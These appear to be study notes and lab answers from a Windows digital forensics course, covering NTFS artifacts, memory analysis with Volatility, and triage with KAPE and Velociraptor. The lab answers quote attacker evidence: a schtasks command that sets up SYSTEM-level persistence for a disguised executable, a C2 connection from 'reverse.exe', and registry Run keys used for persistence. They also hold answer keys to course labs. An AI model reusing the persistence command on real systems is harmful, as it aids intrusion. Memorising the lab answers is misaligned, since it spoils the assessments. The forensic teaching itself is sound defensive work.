<h4 id="windows-forensics-overview">Windows Forensics Overview</h4>
<p>NTFS (New Technology File System) </p>
<p>Here are some of the key forensic artifacts that digital investigators often analyze when working with NTFS file systems:</p>
<p><code>File Metadata:</code> NTFS stores extensive metadata for each file, including creation time, modification time, access time, and attribute information (such as read-only, hidden, or system file attributes). Analyzing these timestamps can help establish timelines and reconstruct user activities.</p>
<p><code>MFT Entries:</code> The Master File Table (MFT) is a crucial component of NTFS that stores metadata for all files and directories on a volume. Examining MFT entries provides insights into file names, sizes, timestamps, and data storage locations. When files are deleted, their MFT entries are marked as available, but the data may remain on the disk until overwritten.</p>
<p>F<code>ile Slack and Unallocated Space:</code> Unallocated space on an NTFS volume may contain remnants of deleted files or fragments of data. File slack refers to the unused portion of a cluster that may contain data from a previous file. Digital forensic tools can help recover and analyze data from these areas.</p>
<p><code>File Signatures:</code> File headers and signatures can be useful in identifying file types even when file extensions have been changed or obscured. This information is critical for reconstructing the types of files present on a system.</p>
<p><code>USN Journal:</code> The Update Sequence Number (USN) Journal is a log maintained by NTFS to record changes made to files and directories. Forensic investigators can analyze the USN Journal to track file modifications, deletions, and renames.</p>
<p><code>LNK Files:</code> Windows shortcut files (LNK files) contain information about the target file or program, as well as timestamps and metadata. These files can provide insights into recently accessed files or executed programs.</p>
<p><code>Prefetch Files:</code> Prefetch files are generated by Windows to improve the startup performance of applications. These files can indicate which programs have been run on the system and when they were last executed.</p>
<p><code>Registry Hives:</code> While not directly related to the file system, Windows Registry hives contain important configuration and system information. Malicious activities or unauthorized changes can leave traces in the registry, which forensic investigators analyze to understand system modifications.</p>
<p><code>Shellbags:</code> Shellbags are registry entries that store folder view settings, such as window positions and sorting preferences. Analyzing shellbags can reveal user navigation patterns and potentially identify accessed folders.</p>
<p><code>Thumbnail Cache:</code> Thumbnail caches store miniature previews of images and documents. These caches can reveal files that were recently viewed, even if the original files have been deleted.</p>
<p><code>Recycle Bin:</code> The Recycle Bin contains files that have been deleted from the file system. Analyzing the Recycle Bin can help recover deleted files and provide insights into user actions.</p>
<p><code>Alternate Data Streams (ADS):</code> ADS are additional streams of data associated with files. Malicious actors may use ADS to hide data, and forensic investigators need to examine these streams to ensure a comprehensive analysis.</p>
<p><code>Volume Shadow Copies:</code> NTFS supports Volume Shadow Copies, which are snapshots of the file system at different points in time. These copies can be valuable for data recovery and analysis of changes made over time.</p>
<p><code>Security Descriptors and ACLs:</code> Access Control Lists (ACLs) and security descriptors determine file and folder permissions. Analyzing these artifacts helps understand user access rights and potential security breaches.</p>
<table>
<thead>
<tr>
<th>Artifact</th>
<th>Location/Registry Key</th>
<th>Data Stored</th>
</tr>
</thead>
<tbody>
<tr>
<td>Prefetch Files</td>
<td>C:\Windows\Prefetch</td>
<td>Metadata about executed applications (file paths, timestamps, execution count)</td>
</tr>
<tr>
<td>Shimcache</td>
<td>Registry: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache</td>
<td>Program execution details (file paths, timestamps, flags)</td>
</tr>
<tr>
<td>Amcache</td>
<td>C:\Windows\AppCompat\Programs\Amcache.hve (Binary Registry Hive)</td>
<td>Application details (file paths, sizes, digital signatures, timestamps)</td>
</tr>
<tr>
<td>UserAssist</td>
<td>Registry: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist</td>
<td>Executed program details (application names, execution counts, timestamps)</td>
</tr>
<tr>
<td>RunMRU Lists</td>
<td>Registry: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU</td>
<td>Recently executed programs and their command lines</td>
</tr>
<tr>
<td>Jump Lists</td>
<td>User-specific folders (e.g., %AppData%\Microsoft\Windows\Recent)</td>
<td>Recently accessed files, folders, and tasks associated with applications</td>
</tr>
<tr>
<td>Shortcut (LNK) Files</td>
<td>Various locations (e.g., Desktop, Start Menu)</td>
<td>Target executable, file paths, timestamps, user interactions</td>
</tr>
<tr>
<td>Recent Items</td>
<td>User-specific folders (e.g., %AppData%\Microsoft\Windows\Recent)</td>
<td>Recently accessed files</td>
</tr>
<tr>
<td>Windows Event Logs</td>
<td>C:\Windows\System32\winevt\Logs</td>
<td>Various event logs containing process creation, termination, and other events</td>
</tr>
</tbody>
</table>
<p>The Windows <code>Registry</code> acts as a crucial database, storing critical system settings for the Windows OS.</p>
<p>Example of <code>Autorun</code> keys used for persistence:</p>
<p><strong>Run/RunOnce Keys</strong></p>
<pre><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\
</code></pre>
<p><strong>Keys used by WinLogon Process</strong></p>
<pre><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell
</code></pre>
<p><strong>Startup Keys</strong></p>
<pre><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User
</code></pre>
<p>SRUM</p>
<p>Switching gears to SRUM (System Resource Usage Monitor), it's a feature introduced in Windows 8 and subsequent versions.</p>
<h4 id="evidence-acquisition-techniques-tools">Evidence Acquisition Techniques &amp; Tools</h4>
<p>Here's an overview of evidence acquisition techniques commonly used in digital forensics:</p>
<pre><code>Forensic Imaging
Extracting Host-based Evidence &amp; Rapid Triage
Extracting Network Evidence
</code></pre>
<p><strong>Forensic Imaging</strong></p>
<p>Below are some forensic imaging tools and solutions:</p>
<ul>
<li>
<p><a href="https://www.exterro.com/digital-forensics-software/ftk-imager-temp">FTK Imager</a>: Developed by AccessData (now acquired by Exterro), FTK Imager is one of the most widely used disk imaging tools in the cybersecurity field. It allows us to create perfect copies (or images) of computer disks for analysis, preserving the integrity of the evidence. It also lets us view and analyze the contents of data storage devices without altering the data.</p>
</li>
<li>
<p><a href="https://github.com/Velocidex/c-aff4">AFF4 Imager</a>: A free, open-source tool crafted for creating and duplicating forensic disk images. It's user-friendly and compatible with numerous file systems. A benefit of the AFF4 Imager is its capability to extract files based on their creation time, segment volumes, and reduce the time taken for imaging through compression.</p>
</li>
<li>
<p>DD and DCFLDD: Both are command-line utilities available on Unix-based systems (including Linux and MacOS). DD is a versatile tool included in most Unix-based systems by default, while DCFLDD is an enhanced version of DD with features specifically useful for forensics, such as hashing.</p>
</li>
<li>
<p>Virtualization Tools: Given the prevalent use of virtualization in modern systems, incident responders will often need to collect evidence from virtual environments. Depending on the specific virtualization solution, evidence can be gathered by temporarily halting the system and transferring the directory that houses it. Another method is to utilize the snapshot capability present in numerous virtualization software tools.</p>
</li>
</ul>
<p>Utilizing <a href="https://arsenalrecon.com/downloads">Arsenal Image Mounter</a> to mount a disk image we have previously created (not the one mentioned above) from a compromised Virtual Machine (VM) running on VMWare. The virtual hard disk of the VM has been stored as <code>HTBVM01-000003.vmdk</code>.</p>
<p><strong>Extracting Host-based Evidence &amp; Rapid Triage</strong></p>
<ul>
<li>Host-based Evidence</li>
</ul>
<p>To capture memory, tools like FTK Imager are commonly employed.</p>
<p>Some other memory acquisition solutions are:</p>
<p><a href="https://github.com/Velocidex/WinPmem">WinPmem</a>: WinPmem has been the default open source memory acquisition driver for windows for a long time. It used to live in the Rekall project, but has recently been separated into its own repository.</p>
<p><a href="https://www.magnetforensics.com/resources/magnet-dumpit-for-windows/">DumpIt</a>: A simplistic utility that generates a physical memory dump of Windows and Linux machines. On Windows, it concatenates 32-bit and 64-bit system physical memory into a single output file, making it extremely easy to use.</p>
<p><a href="http://www.nirsoft.net/utils/nircmd.html">MemDump</a>: MemDump is a free, straightforward command-line utility that enables us to capture the contents of a system's RAM. It’s quite beneficial in forensics investigations or when analyzing a system for malicious activity. Its simplicity and ease of use make it a popular choice for memory acquisition.</p>
<p><a href="https://belkasoft.com/ram-capturer">Belkasoft RAM Capturer</a>: This is another powerful tool we can use for memory acquisition, provided free of charge by Belkasoft. It can capture the RAM of a running Windows computer, even if there's active anti-debugging or anti-dumping protection. This makes it a highly effective tool for extracting as much data as possible during a live forensics investigation.</p>
<p><a href="https://www.magnetforensics.com/resources/magnet-ram-capture/">Magnet RAM Capture</a>: Developed by Magnet Forensics, this tool provides a free and simple way to capture the volatile memory of a system.</p>
<p><a href="https://github.com/504ensicsLabs/LiME">LiME (Linux Memory Extractor)</a>: LiME is a Loadable Kernel Module (LKM) which allows the acquisition of volatile memory. LiME is unique in that it's designed to be transparent to the target system, evading many common anti-forensic measures.</p>
<ul>
<li>Rapid Triage</li>
</ul>
<p>This approach emphasizes collecting data from potentially compromised systems. The goal is to centralize high-value data, streamlining its indexing and analysis. By centralizing this data, analysts can more effectively deploy tools and techniques, honing in on systems with the most evidentiary value. This targeted approach allows for a deeper dive into digital forensics, offering a clearer picture of the adversary's actions.</p>
<p>One of the best, if not the best, rapid artifact parsing and extraction solutions is <a href="https://www.kroll.com/en/services/cyber-risk/incident-response-litigation-support/kroll-artifact-parser-extractor-kape">KAPE (Kroll Artifact Parser and Extractor)</a>. </p>
<p><a href="https://github.com/Velocidex/velociraptor">Velociraptor</a> is a potent tool for gathering host-based information using Velociraptor Query Language (VQL) queries. Beyond this, Velociraptor can execute <code>Hunts</code> to amass various artifacts. A frequently utilized artifact is the <code>Windows.KapeFiles.Targets</code>. While KAPE (Kroll Artifact Parser and Extractor) itself isn't open-source, its file collection logic, encoded in YAML, is accessible via the <a href="https://github.com/EricZimmerman/KapeFiles">KapeFiles project</a>. This approach is a staple in Rapid Triage.</p>
<p><strong>Extracting Network Evidence</strong></p>
<p>First up, our Intro to Network Traffic Analysis and Intermediate Network Traffic Analysis modules covered traffic capture analysis. Think of traffic capture as a snapshot of all the digital conversations happening in our network. Tools like <code>Wireshark</code> or <code>tcpdump</code> allow us to capture and dissect these packets, giving us a granular view of data in transit.</p>
<p>Then, our Working with <code>IDS/IPS</code> and Detecting Windows Attacks with Splunk modules covered the usage of IDS/IPS-derived data. Intrusion Detection Systems (IDS) are our watchful sentinels, constantly monitoring network traffic for signs of malicious activity. When they spot something amiss, they alert us. On the other hand, Intrusion Prevention Systems (IPS) take it a step further. Not only do they detect, but they also take pre-defined actions to block or prevent those malicious activities.</p>
<p>Traffic flow data, often sourced from tools like NetFlow or sFlow, provides us with a broader view of our network's behavior. While it might not give us the nitty-gritty details of each packet, it offers a high-level overview of traffic patterns.</p>
<p>Lastly, our trusty <code>firewalls</code>. These are not just barriers that block or allow traffic based on predefined rules. Modern firewalls are intelligent beasts. They can identify applications, users, and even detect and block threats. By analyzing firewall logs, we can uncover attempts to exploit vulnerabilities, unauthorized access attempts, and other malicious activities.</p>
<p><strong>Q:</strong> Visit the URL "https://127.0.0.1:8889/app/index.html#/search/all" and log in using the credentials: admin/password. After logging in, click on the circular symbol adjacent to "Client ID". Subsequently, select the displayed "Client ID" and click on "Collected". Initiate a new collection and gather artifacts labeled as "Windows.KapeFiles.Targets" using the _SANS_Triage configuration. Lastly, examine the collected artifacts and enter the name of the scheduled task that begins with 'A' and concludes with 'g' as your answer.</p>
<pre><code class="language-powershell"> C:\Windows\System32\Tasks 

 Get-ChildItem -Path &quot;C:\Users\Administrator\Downloads\E-CORP-C.e0967723979c1134-F.CU8021N32BD00\results&quot; -Recurse | Select-String -Pattern &quot;System32\\\\Tasks&quot; | ForEach-Object {
    [PSCustomObject]@{
        FilePath = $_.Path
        LineNumber = $_.LineNumber
        LineContent = $_.Line
    }
}
</code></pre>
<p><img alt="alt text" src="../assets/image36.png" />
AutorunsToWinEventLog</p>
<h4 id="memory-forensics">Memory Forensics</h4>
<p>Here are some types of data found in RAM that are valuable for incident investigation:</p>
<pre><code>Network connections
File handles and open Files
Open registry keys
Running processes on the system
Loaded modules
Loaded device drivers
Command history and console sessions
Kernel data structures
User and credential information
Malware artifacts
System configuration
Process memory regions
</code></pre>
<p>The preferred tool for conducting memory forensics is <a href="https://www.volatilityfoundation.org/releases">Volatility</a>. Volatility is a leading open-source memory forensics framework.</p>
<p>Some commonly used Volatility modules include:</p>
<pre><code>pslist: Lists the running processes.
cmdline: Displays process command-line arguments
netscan: Scans for network connections and open ports.
malfind: Scans for potentially malicious code injected into processes.
handles: Scans for open handles
svcscan: Lists Windows services.
dlllist: Lists loaded DLLs (Dynamic-link Libraries) in a process.
hivelist: Lists the registry hives in memory.
</code></pre>
<p>Volatility offers extensive documentation. You can find modules and their associated documentation using the following links:</p>
<p>Volatility v2: https://github.com/volatilityfoundation/volatility/wiki/Command-Reference</p>
<p>Volatility v3: https://volatility3.readthedocs.io/en/latest/index.html</p>
<p>A useful Volatility (v2 &amp; v3) cheatsheet can be found here: https://blog.onfvp.com/post/volatility-cheatsheet/</p>
<p><strong>Volatility v2 Fundamentals</strong></p>
<ol>
<li>Identifying the Profile</li>
</ol>
<p><code>$ vol.py -f /home/htb-student/MemoryDumps/Win7-2515534d.vmem imageinfo</code></p>
<ol>
<li>Identifying Running Processes</li>
</ol>
<p><code>$ vol.py -f /home/htb-student/MemoryDumps/Win7-2515534d.vmem --profile=Win7SP1x64 pslist</code></p>
<ol>
<li>Identifying Network Artifacts</li>
</ol>
<p><code>$ vol.py -f /home/htb-student/MemoryDumps/Win7-2515534d.vmem --profile=Win7SP1x64 netscan</code></p>
<p>To find <code>_TCPT_OBJECT</code> structures using pool tag scanning, use the <code>connscan</code> command.</p>
<ol>
<li>Identifying Injected Code</li>
</ol>
<p><code>$ vol.py -f /home/htb-student/MemoryDumps/Win7-2515534d.vmem --profile=Win7SP1x64 malfind --pid=608</code></p>
<ol>
<li>Identifying Handles</li>
</ol>
<p>The <code>handles</code> plugin in Volatility is used for analyzing the handles (file and object references) held by a specific process within a memory dump. </p>
<p><code>$ vol.py -f /home/htb-student/MemoryDumps/Win7-2515534d.vmem --profile=Win7SP1x64 handles -p 1512 --object-type=Key</code></p>
<p><code>$ vol.py -f /home/htb-student/MemoryDumps/Win7-2515534d.vmem --profile=Win7SP1x64 handles -p 1512 --object-type=File</code></p>
<p><code>$ vol.py -f /home/htb-student/MemoryDumps/Win7-2515534d.vmem --profile=Win7SP1x64 handles -p 1512 --object-type=Process</code></p>
<ol>
<li>Identifying Windows Services</li>
</ol>
<p>The <code>svcscan</code> plugin in Volatility is used for listing and analyzing Windows services running on a system within a memory dump.</p>
<p><code>$ vol.py -f /home/htb-student/MemoryDumps/Win7-2515534d.vmem --profile=Win7SP1x64 svcscan | more</code></p>
<ol>
<li>Identifying Loaded DLLs</li>
</ol>
<p><code>$ vol.py -f /home/htb-student/MemoryDumps/Win7-2515534d.vmem --profile=Win7SP1x64 dlllist -p 1512</code></p>
<ol>
<li>Identifying Hives</li>
</ol>
<p><code>$ vol.py -f /home/htb-student/MemoryDumps/Win7-2515534d.vmem --profile=Win7SP1x64 hivelist</code></p>
<p><strong>Rootkit Analysis with Volatility v2</strong></p>
<p><a href="https://www.nirsoft.net/kernel_struct/vista/EPROCESS.html">EPROCESS</a> is a data structure in the Windows kernel that represents a process. Each running process in the Windows operating system has a corresponding EPROCESS block in kernel memory. During memory analysis, the examination of EPROCESS structures is crucial for understanding the running processes on a system, identifying parent-child relationships, and determining which processes were active at the time of the memory capture.</p>
<p>The <code>psscan</code> plugin is used to enumerate running processes.</p>
<p><code>$ vol.py -f /home/htb-student/MemoryDumps/rootkit.vmem psscan</code></p>
<p>In the output below, we can see that the <code>pslist</code> plugin could not find <code>test.exe</code> which was hidden by a rootkit, but the <code>psscan</code> plugin was able to find it.</p>
<p><strong>Memory Analysis Using Strings</strong></p>
<ol>
<li>Identifying IPv4 Addresses</li>
</ol>
<p><code>$ strings /home/htb-student/MemoryDumps/Win7-2515534d.vmem | grep -E "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"</code></p>
<ol>
<li>Identifying Email Addresses</li>
</ol>
<p><code>$ strings /home/htb-student/MemoryDumps/Win7-2515534d.vmem | grep -oE "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,4}\b"</code></p>
<ol>
<li>Identifying Command Prompt or PowerShell Artifacts</li>
</ol>
<p><code>$ strings /home/htb-student/MemoryDumps/Win7-2515534d.vmem | grep -E "(cmd|powershell|bash)[^\s]+"</code></p>
<p><strong>Q1:</strong> Examine the file "/home/htb-student/MemoryDumps/Win7-2515534d.vmem" with Volatility. Enter the parent process name for @WanaDecryptor (Pid 1060) as your answer. Answer format: _.exe</p>
<pre><code class="language-sh">$ /usr/local/bin/vol.py -f /home/htb-student/MemoryDumps/Win7-2515534d.vmem imageinfo

$ /usr/local/bin/vol.py -f /home/htb-student/MemoryDumps/Win7-2515534d.vmem --profile=Win7SP1x64 pslist -p 1060

$ /usr/local/bin/vol.py -f /home/htb-student/MemoryDumps/Win7-2515534d.vmem --profile=Win7SP1x64 pslist -p 1792
</code></pre>
<p><strong>Q2:</strong> Examine the file "/home/htb-student/MemoryDumps/Win7-2515534d.vmem" with Volatility. tasksche.exe (Pid 1792) has multiple file handles open. Enter the name of the suspicious-looking file that ends with .WNCRYT as your answer. Answer format: _.WNCRYT</p>
<pre><code class="language-sh">$ /usr/local/bin/vol.py -f /home/htb-student/MemoryDumps/Win7-2515534d.vmem --profile=Win7SP1x64 handles -p 1792 --object-type=Key

$ /usr/local/bin/vol.py -f /home/htb-student/MemoryDumps/Win7-2515534d.vmem --profile=Win7SP1x64 handles -p 1792 --object-type=File
hibsys.WNCRYT

$ /usr/local/bin/vol.py -f /home/htb-student/MemoryDumps/Win7-2515534d.vmem --profile=Win7SP1x64 handles -p 1792 --object-type=Process
</code></pre>
<p><strong>Q3:</strong> Examine the file "/home/htb-student/MemoryDumps/Win7-2515534d.vmem" with Volatility. Enter the Pid of the process that loaded zlib1.dll as your answer.</p>
<pre><code class="language-sh">$ vol.py -f /home/htb-student/MemoryDumps/Win7-2515534d.vmem --profile=Win7SP1x64 dlllist

$ vol.py -f /home/htb-student/MemoryDumps/Win7-2515534d.vmem --profile=Win7SP1x64 dlllist -p 3012
</code></pre>
<h4 id="disk-forensics">Disk Forensics</h4>
<p>Enter <a href="https://www.autopsy.com/">Autopsy</a>: a user-friendly forensic platform built atop the open-source Sleuth Kit toolset. It mirrors many features you'd find in its commercial counterparts: timeline assessments, keyword hunts, web and email artifact retrievals, and the ability to sift results based on known malicious file hashes.</p>
<h4 id="rapid-triage-examination-analysis-tools">Rapid Triage Examination &amp; Analysis Tools</h4>
<p>Eric Zimmerman's forensic tools: https://ericzimmerman.github.io/#!index.md</p>
<p><strong>MAC(b) Times in NTFS</strong></p>
<p>The term <code>MAC(b)</code> times denotes a series of timestamps linked to files or objects. These timestamps are pivotal as they shed light on the chronology of events or actions on a file system. The acronym <code>MAC(b)</code> is an abbreviation for <code>Modified, Accessed, Changed, and (b) Birth</code> times. The inclusion of <code>b</code> signifies the <code>Birth timestamp</code>, which isn't universally present across all file systems or easily accessible via standard Windows API functions. Let's delve deeper into the nuances of <code>MACB</code> timestamps.</p>
<p><strong>General Rules for Timestamps in the Windows NTFS File System</strong></p>
<table>
<thead>
<tr>
<th>Operation</th>
<th>Modified</th>
<th>Accessed</th>
<th>Birth (Created)</th>
</tr>
</thead>
<tbody>
<tr>
<td>File Create</td>
<td>Yes</td>
<td>Yes</td>
<td>Yes</td>
</tr>
<tr>
<td>File Modify</td>
<td>Yes</td>
<td>No</td>
<td>No</td>
</tr>
<tr>
<td>File Copy</td>
<td>No (Inherited)</td>
<td>Yes</td>
<td>Yes</td>
</tr>
<tr>
<td>File Access</td>
<td>No</td>
<td>No*</td>
<td>No</td>
</tr>
</tbody>
</table>
<p>All these timestamps reside in the <code>$MFT</code> file, located at the root of the system drive. </p>
<p>These timestamps are housed within the $MFT across two distinct attributes:</p>
<p><code>$STANDARD_INFORMATION</code></p>
<p><code>$FILE_NAME</code></p>
<p><strong>Structure of MFT File Record</strong></p>
<p><img alt="alt text" src="../assets/image37.png" /></p>
<p><code>Get-Item * -Stream Zone.Identifier -ErrorAction SilentlyContinue</code></p>
<p><code>Get-Content * -Stream Zone.Identifier -ErrorAction SilentlyContinue</code></p>
<p><strong>Q1:</strong> During our examination of the USN Journal within Timeline Explorer, we observed "uninstall.exe". The attacker subsequently renamed this file. Use Zone.Identifier information to determine its new name and enter it as your answer.</p>
<pre><code class="language-powershell">.\MFTECmd.exe -f 'C:\Users\johndoe\Desktop\forensic_data\kape_output\D\$Extend\$J' --csv C:\Users\johndoe\Desktop\forensic_data\mft_analysis\ --csvf MFT-J.csv

.\MFTECmd.exe -f 'C:\Users\johndoe\Desktop\forensic_data\kape_output\D\$MFT' --csv C:\Users\johndoe\Desktop\forensic_data\mft_analysis\ --csvf MFT.csv

Zone Id Contents
&quot;[ZoneTransfer]
ZoneId=3
ReferrerUrl=http://10.10.10.10:443/
HostUrl=http://10.10.10.10:443/uninstall.exe
&quot;
</code></pre>
<p>Filter Zone Id Contents contain 3, and find the entry number 90469 which is <code>microsoft.windowskits.feedback.exe</code></p>
<p><img alt="alt text" src="../assets/image38.png" /></p>
<p><strong>Q2:</strong> Review the file at "C:\Users\johndoe\Desktop\forensic_data\kape_output\D\Windows\System32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx" using Timeline Explorer. It documents the creation of two scheduled tasks. Enter the name of the scheduled task that begins with "M" and concludes with "r" as your answer.</p>
<pre><code class="language-powershell">.\EvtxECmd.exe --sync

.\EvtxECmd.exe -f &quot;C:\Users\johndoe\Desktop\forensic_data\kape_output\D\Windows\System32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx&quot; --csv &quot;C:\Users\johndoe\Desktop\forensic_data\event_logs\csv_timeline&quot; --csvf kape_event_log.csv

Executable Info
schtasks  /Create /TN &quot;Microsoft-Windows-DiagnosticDataCollector&quot; /TR &quot;C:\Windows\Tasks\microsoft.windowskits.feedback.exe&quot; /SC DAILY /ST 12:00 /RL HIGHEST /F /RU SYSTEM
</code></pre>
<p>Filter payload contains <code>schtasks</code></p>
<p><strong>Q3:</strong>  Examine the contents of the file located at "C:\Users\johndoe\Desktop\forensic_data\APMX64\discord.apmx64" using API Monitor. "discord.exe" performed process injection against another process as well. Identify its name and enter it as your answer.</p>
<p><img alt="alt text" src="../assets/image39.png" /></p>
<h4 id="practical-digital-forensics-scenario">Practical Digital Forensics Scenario</h4>
<p><strong>Memory Analysis with Volatility v3</strong></p>
<ul>
<li>Identifying the Memory Dump's Profile</li>
</ul>
<p><code>python vol.py -q -f ..\memdump\PhysicalMemory.raw windows.info</code></p>
<ul>
<li>Identifying Injected Code</li>
</ul>
<p><code>python vol.py -q -f ..\memdump\PhysicalMemory.raw windows.malfind</code></p>
<ul>
<li>Identifying Running Processes</li>
</ul>
<p><code>python vol.py -q -f ..\memdump\PhysicalMemory.raw windows.pslist</code></p>
<p><code>python vol.py -q -f ..\memdump\PhysicalMemory.raw windows.pstree</code></p>
<ul>
<li>Identifying Process Command Lines</li>
</ul>
<p><code>python vol.py -q -f ..\memdump\PhysicalMemory.raw windows.cmdline</code></p>
<p><strong>Dumping Process Memory &amp; Leveraging YARA</strong></p>
<pre><code class="language-powershell">python vol.py -q -f ..\memdump\PhysicalMemory.raw windows.memmap --pid 3648 --dump

PS C:\Users\johndoe&gt; $rules = Get-ChildItem C:\Users\johndoe\Desktop\yara-4.3.2-2150-win64\rules | Select-Object -Property Name

PS C:\Users\johndoe&gt; foreach ($rule in $rules) {C:\Users\johndoe\Desktop\yara-4.3.2-2150-win64\yara64.exe C:\Users\johndoe\Desktop\yara-4.3.2-2150-win64\rules\$($rule.Name) C:\Users\johndoe\Desktop\pid.3648.dmp}
</code></pre>
<ul>
<li>Identifying Loaded DLLs</li>
</ul>
<p><code>python vol.py -q -f ..\memdump\PhysicalMemory.raw windows.dlllist --pid 3648</code></p>
<ul>
<li>Identifying Handles</li>
</ul>
<p><code>python vol.py -q -f ..\memdump\PhysicalMemory.raw windows.handles --pid 3648</code></p>
<ul>
<li>Identifying Network Artifacts</li>
</ul>
<p><code>python vol.py -q -f ..\memdump\PhysicalMemory.raw windows.netstat</code></p>
<p><code>python vol.py -q -f ..\memdump\PhysicalMemory.raw windows.netscan</code></p>
<p><strong>Disk Image/Rapid Triage Data Examination &amp; Analysis</strong></p>
<p><strong>Extracting Cobalt Strike Beacon Configuration</strong></p>
<p><code>python parse_beacon_config.py E:\payload.dll</code></p>
<p><strong>Analyzing Rapid Triage Data - Windows Event Logs (Chainsaw)</strong></p>
<p><code>chainsaw_x86_64-pc-windows-msvc.exe hunt "..\kapefiles\auto\C%3A\Windows\System32\winevt\Logs" -s sigma/ --mapping mappings/sigma-event-logs-all.yml -r rules/ --csv --output output_csv</code></p>
<p><strong>Q1:</strong> Extract and scrutinize the memory content of the suspicious PowerShell process which corresponds to PID 6744. Determine which tool from the PowerSploit repository (accessible at https://github.com/PowerShellMafia/PowerSploit) has been utilized within the process, and enter its name as your answer.</p>
<p><code>PowerView</code></p>
<pre><code class="language-powershell">python vol.py -q -f ..\memdump\PhysicalMemory.raw windows.memmap --pid 6744 --dump

PS C:\Users\johndoe&gt; $rules = Get-ChildItem C:\Users\johndoe\Desktop\yara-4.3.2-2150-win64\rules | Select-Object -Property Name

foreach ($rule in $rules) {C:\Users\johndoe\Desktop\yara-4.3.2-2150-win64\yara64.exe C:\Users\johndoe\Desktop\yara-4.3.2-2150-win64\rules\$($rule.Name) C:\Users\johndoe\Desktop\pid.6744.dmp}
</code></pre>
<p><strong>Q2:</strong> Investigate the USN Journal located at "C:\Users\johndoe\Desktop\kapefiles\ntfs\%5C%5C.%5CC%3A\$Extend\$UsnJrnl%3A$J" to determine how "advanced_ip_scanner.exe" was introduced to the compromised system. Enter the name of the associated process as your answer. Answer format: _.exe</p>
<p><code>rundl32.exe</code></p>
<p>Use Autopsy, timeline-&gt;List</p>
<pre><code class="language-powershell">python C:\Users\johndoe\Desktop\files\USN-Journal-Parser-master\usnparser\usn.py -f 'C:\Users\johndoe\Desktop\kapefiles\ntfs\%5C%5C.%5CC%3A\$Extend\$UsnJrnl%3A$J' -o C:\Users\johndoe\Desktop\usn_output.csv -c

$time1 = [DateTime]::ParseExact(&quot;2023-08-10 09:00:00.000000&quot;, &quot;yyyy-MM-dd HH:mm:ss.ffffff&quot;, $null)

$time2 = [DateTime]::ParseExact(&quot;2023-08-10 10:00:00.000000&quot;, &quot;yyyy-MM-dd HH:mm:ss.ffffff&quot;, $null)

Import-Csv -Path C:\Users\johndoe\Desktop\usn_output.csv | Where-Object { $_.'FileName' -match '\.exe$|\.txt$|\.msi$|\.bat$|\.ps1$|\.iso$|\.lnk$' } | Where-Object { $_.timestamp -as [DateTime] -ge $time1 -and $_.timestamp -as [DateTime] -lt $time2 }
</code></pre>
<h4 id="skills-assessment_2">Skills Assessment</h4>
<p><strong>Q1:</strong> Using VAD analysis, pinpoint the suspicious process and enter its name as your answer. Answer format: _.exe</p>
<p><code>Windows.System.VAD</code></p>
<p>Check for processes with memory sections marked as <code>EXECUTE_READWRITE</code> or suspicious permissions.</p>
<p>Cross-refrence:  <code>Windows.System.PsList</code></p>
<p>Search for strings not contain <code>Windows</code>: <code>^(?!.*Windows).*</code></p>
<pre><code class="language-json">&quot;ProtectionMsg&quot;:&quot;PAGE_EXECUTE_READWRITE&quot;,

{&quot;Pid&quot;:8244,&quot;Ppid&quot;:6548,&quot;TokenIsElevated&quot;:true,&quot;Name&quot;:&quot;reverse.exe&quot;,&quot;CommandLine&quot;:&quot;\&quot;C:\\Users\\j0seph\\AppData\\Local\\reverse.exe\&quot; 
</code></pre>
<p>reverse.exe</p>
<p><strong>Q2:</strong> Determine the IP address of the C2 (Command and Control) server and enter it as your answer.</p>
<p><code>Windows.Network.Netstat</code></p>
<pre><code class="language-json">{&quot;Pid&quot;:7924,&quot;Name&quot;:&quot;reverse.exe&quot;,&quot;Family&quot;:&quot;IPv4&quot;,&quot;Type&quot;:&quot;TCP&quot;,&quot;Status&quot;:&quot;SENT&quot;,&quot;Laddr.IP&quot;:&quot;10.129.228.172&quot;,&quot;Laddr.Port&quot;:57265,&quot;Raddr.IP&quot;:&quot;3.19.219.4&quot;,&quot;Raddr.Port&quot;:80,&quot;Timestamp&quot;:&quot;2025-01-22T04:59:57Z&quot;}
</code></pre>
<p><strong>Q3:</strong> Determine the registry key used for persistence and enter it as your answer.</p>
<p>https://docs.velociraptor.app/artifact_references/</p>
<p><code>Windows.Registry.WDigest</code></p>
<p>The Windows Registry is a database of low-level operating systems and application settings. The Run keys are specific keys within the Registry that contain a path that runs every time a user logs on, and they are listed below:</p>
<ul>
<li>
<p>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run — Run path when the current user logs in</p>
</li>
<li>
<p>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run — Run path when any user logs in</p>
</li>
<li>
<p>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce — Run path when the current user logs in, then delete</p>
</li>
<li>
<p>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce — Run path when any user logs in, then delete</p>
</li>
</ul>
